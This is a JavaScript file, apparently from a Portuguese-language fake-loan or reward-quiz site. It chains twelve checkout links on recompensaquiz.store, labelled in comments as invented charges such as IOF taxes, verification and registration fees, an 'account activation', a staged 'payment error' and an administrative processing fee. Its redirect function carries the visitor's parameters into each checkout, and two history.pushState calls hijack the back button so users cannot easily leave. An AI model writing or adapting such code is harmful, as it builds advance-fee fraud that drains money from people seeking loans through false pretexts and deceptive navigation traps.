const baseLinks = {
    up1: "https://checkout.recompensaquiz.store/VCCL1O8SCGG3", // IOF
    up2: "https://checkout.recompensaquiz.store/VCCL1O8SCGG5", // Taxa de verificação de IOF
    up3: "https://checkout.recompensaquiz.store/VCCL1O8SCGGC", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://checkout.recompensaquiz.store/VCCL1O8SCGGD", // NFe
    up5: "https://checkout.recompensaquiz.store/VCCL1O8SCGGE", // Ativar conta
    up6: "https://checkout.recompensaquiz.store/VCCL1O8SCGGF", // Taxa de registro do contrato
    up7: "https://checkout.recompensaquiz.store/VCCL1O8SCGGG", // Parabéns, 20k adicional
    up8: "https://checkout.recompensaquiz.store/VCCL1O8SCGGH", // Erro no pagamento - 14,06
    up9: "https://checkout.recompensaquiz.store/VCCL1O8SCGGI", // APP - 11,99
    up10:"https://checkout.recompensaquiz.store/VCCL1O8SCGGJ", // Taxa de Abertura TAC - 16,92
    up11:"https://checkout.recompensaquiz.store/VCCL1O8SCGGK",// Taxa de Consultoria Financeira - 19,53
    up12:"https://checkout.recompensaquiz.store/VCCL1O8SCGGL" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);

